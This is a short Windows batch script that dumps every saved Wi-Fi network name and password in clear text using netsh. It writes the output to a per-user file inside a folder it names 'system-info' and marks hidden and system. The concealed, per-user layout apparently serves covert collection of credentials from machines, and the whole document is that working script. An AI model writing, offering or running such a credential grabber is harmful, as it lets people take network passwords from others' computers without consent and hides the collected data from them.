
:::: Run as Admin, This Batch file extracts the wifi passwords in clear text :::::: 

@echo off

:::::: 1. Creating Main Hidden Directory ::::::

if NOT EXIST system-info (
md system-info
attrib +h +s system-info
cd system-info
) ELSE (
cd system-info
)

:::::: 2. Creating Directory for user ::::::
set user=%USERDOMAIN%_%USERNAME%
md %user%
cd %user%

:::::: 3. Extracting Wifi Passwords to file ::::::
for /f "skip=9 tokens=1-4* delims= " %%a in ('netsh wlan show profiles') do @netsh wlan show profile name="%%e" key=clear | findstr /c:"SSID name" /c:"Key Content" >> wifi.txt && echo. >> wifi.txt

